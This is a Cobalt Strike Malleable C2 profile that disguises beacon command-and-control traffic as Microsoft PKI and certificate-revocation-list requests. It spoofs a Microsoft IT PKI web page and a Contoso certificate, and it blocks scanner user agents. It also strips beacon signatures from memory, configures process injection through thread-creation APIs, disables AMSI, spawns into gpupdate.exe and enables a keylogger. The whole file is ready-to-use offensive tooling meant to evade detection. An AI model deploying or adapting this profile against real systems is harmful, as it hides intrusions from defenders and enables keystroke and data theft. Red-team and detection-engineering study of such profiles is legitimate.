#mscrl profile
#xx0hcd

###Global Options###
set sample_name "mscrl.profile";

set sleeptime "38500";
set jitter    "33";
set data_jitter "50";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36";

set host_stage "false";

###DNS options###
dns-beacon {
    # Options moved into 'dns-beacon' group in 4.3:
    set dns_idle             "8.8.8.8";
    set dns_max_txt          "220";
    set dns_sleep            "0";
    set dns_ttl              "1";
    set maxdns               "255";
    set dns_stager_prepend   ".wwwds.";
    set dns_stager_subhost   ".e2867.dsca.";
     
    # DNS subhost override options added in 4.3:
    set beacon               "d-bx.";
    set get_A                "d-1ax.";
    set get_AAAA             "d-4ax.";
    set get_TXT              "d-1tx.";
    set put_metadata         "d-1mx";
    set put_output           "d-1ox.";
    set ns_response          "zero";
}

###SMB options###
set pipename "ntsvcs##";
set pipename_stager "scerpc##";
set smb_frame_header "";

###TCP options###
set tcp_port "8000";
set tcp_frame_header "";

###SSH options###
set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
set ssh_pipename "SearchTextHarvester##";

###SSL Options###
#https-certificate {
#    set keystore "";
#    set password "";
#}

https-certificate {
    set C "US";
    set CN "Contoso.com";
    set L "California";
    set O "Contoso LLC.";
    set OU "contoso.org";
    set ST "CA";
    set validity "365";
}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
    set trust_x_forwarded_for "false";
    set block_useragents "curl*,lynx*,wget*";
}

###HTTP-GET Block###
http-get {

    set uri "/pki/mscorp/cps/default.htm";
    
    client {

       # header "Host" "";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*,q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        header "Connection" "close";

	   
    metadata {
        base64;

        prepend "mscrlId=";
        header "Cookie";

    }

    }

    server {
    
        header "Content-Type" "text/html";
        header "x-ms-version" "2009-09-19";
        header "x-ms-lease-status" "unlocked";
        header "x-ms-blob-type" "BlockBlob";
        header "Vary" "Accept-Encoding";
        header "Connection" "close";
        header "TLS_version" "tls1.2";
        header "Strict-Transport-Security" "max-age=31536000";
        header "X-RTag" "RT";
 
        output {

            base64;
            
            prepend "<!DOCTYPE html>
<html>

<head>
  <title>PKI Repository (SSL) - Microsoft IT</title>
  <meta charset=\"UTF-8\">
</head>

<body>
<table style=\"width:100%\">
  <tr>
    <td><img src=\"default_files/image001.jpg\" alt=\"Microsoft Logo\"/></td>
    <td>
	<a href=\"https://www.cpacanada.ca/webtrustseal?sealid=10259\">
		<img src=\"default_files/WebTrust-For-CA_BDO.JPG\" alt=\"WebTrust Seal\"/>
	</a>
    </td>
    <td>
	<a href=\"https://www.cpacanada.ca/webtrustseal?sealid=10260\">
		<img src=\"default_files/WebTrust-For-BR-SSL_BDO.JPG\" alt=\"Baseline Requirements Seal\"/>
	</a>
    </td>
   </tr>
</table> 
<h1>PKI Repository</h1>

<h2>Policy</h2>

<h3>Microsoft IT PKI (SSL) Certificate Policy (CP) and Certification Practice Statement (CPS)</h3>
<ul>
	<li>Current Version: <a href=\"Microsoft DSRE PKI CP-CPS for TLS Ver 2.4 March 2020/Microsoft DSRE PKI CP-CPS for TLS Ver 2.4 March 2020.htm\">Microsoft DSRE PKI CP-CPS for TLS Ver 2.4 March 2020</a></li>
	<li>Previous Version: <a href=\"Microsoft DSRE PKI CP-CPS for TLS Ver 2.3 June 2019/Microsoft DSRE PKI CP-CPS for TLS Ver 2.3 June 2019.htm\">Microsoft DSRE PKI CP-CPS for TLS Ver 2.3 June 2019</a></a></li>
</ul>

<h3>Privacy Policy</h3>
<ul>
	<li><a href=\"http://go.microsoft.com/fwlink/?LinkId=248681\">Microsoft Privacy Policy</a></li>
</ul>

<h2>Certificates and CRLs</h2>

<h3>Microsoft IT TLS CA 1</h3>
<ul>

	<li>CA Certificate: <a href=\"http://www.microsoft.com/pki/mscorp/Microsoft%20IT%20TLS%20CA%201.crt\">Microsoft IT TLS CA 1.crt</a></li>
	<li>Thumbprint:";
            
            append "</li>
	<li>Authority Key Identifier: e5 9d 59 30 82 47 58 cc ac fa 08 54 36 86 7b 3a b5 04 4d f0</li>
</ul>

<h2>FINAL REPORTS</h2>

<ul>
	<li><a href=\"June 2019 Final Reports/Microsoft DSRE WTBR Indp Acct Report and Mgmt Assertion Aug 2019 - FINAL.pdf\">Baseline Requirements - Jun 2019</a></li>
	<li><a href=\"June 2019 Final Reports/Microsoft DSRE WTCA Indp Acct Report and Mgmt Assertion Aug 2019 - FINAL.pdf\">WebTrust - Jun 2019</a></li>
	<li><a href=\"January 2019 Final Reports/Microsoft CSEO 2019 WTBR Indp Auditor Opinion and Mgmt Assertion April 2019 - FINAL.pdf\">Baseline Requirements - Jan 2019</a></li>
	<li><a href=\"January 2019 Final Reports/Microsoft CSEO 2019 WTCA Indp Auditor Opinion and Mgmt Assertion April 2019 - FINAL.pdf\">WebTrust - Jan 2019</a></li>
</ul>

</body>

</html>";      
	  

            print;
        }
    }
}



###HTTP-Post Block###
http-post {
    
    set uri "/pki/mscorp/crl/msitwww1.crl";
    set verb "GET";
    #set verb "POST";

    client {

	#header "Host" "";
	header "Accept" "*/*";
	header "Accept-Language" "en";
	header "Connection" "close";
        
        output {
            base64url;
	    header "x-ms-request-id";
        }

        id {
	    base64url;
            header "Content-MD5";

        }
    }

    server {
    
        header "Age" "1919";
	header "Content-Type" "application/octet-stream";
	header "x-ms-blob-type" "BlockBlob";
	header "x-ms-lease-status" "unlocked";
	header "x-ms-version" "572";
	header "Connection" "close";

        output {
            netbios;
            
	    prepend "SHA1170328210940Z170405212940Z\n  ";
	    prepend "Microsoft Corporation10UMicrosoft IT10UMicrosoft IT SSL\n ";
	    prepend "Washington10URedmond10U\n";
	    prepend "080 0 *H010 UUS10U\n";

            print;
        }
    }
}



###HTTP-Stager Block###
http-stager {

    set uri_x86 "/pki/mscorp/crl/Msitwww1.crl";
    set uri_x64 "/pki/mscorp/CRL/msitwww1.crl";

    client {
        
        #header "Host" "";
	header "Accept" "*/*";
	header "Accept-Language" "en";
	header "Connection" "close";
    }

    server {
        
        header "Content-Type" "text/html;charset=utf-8";
        header "Connection" "close";
        header "Server" "ZOOM";
        header "X-Robots-Tag" "noindex, nofollow";
        header "X-Content-Type-Options" "nosniff";
	
	output {
	
	    prepend "content=";
	    
	    append "</script>\n";
	    print;
	}

    }
}


###Malleable PE/Stage Block###
stage {
    set checksum        "0";
    set compile_time    "17 Oct 2020 04:32:14";
    set entry_point     "170001";
    #set image_size_x86 "6586368";
    #set image_size_x64 "6586368";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "true";
    set sleep_mask	"true";
    set stomppe	        "true";
    set obfuscate	"true";
    set rich_header     "";
    
    set sleep_mask "true";
    
    set smartinject "true";
    
    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
    #set allocator "HeapAlloc";
    set magic_mz_x86 "MZRE";
    set magic_mz_x64 "MZAR";
    set magic_pe "EA";

    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #string "something";
    #data "something";
    #stringw "something"; 
}

###Process Inject Block###
process-inject {

    set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "true";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

    set obfuscate "true";

    set smartinject "true";

    set amsi_disable "true";
    
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
    set keylogger "SetWindowsHookEx";


}
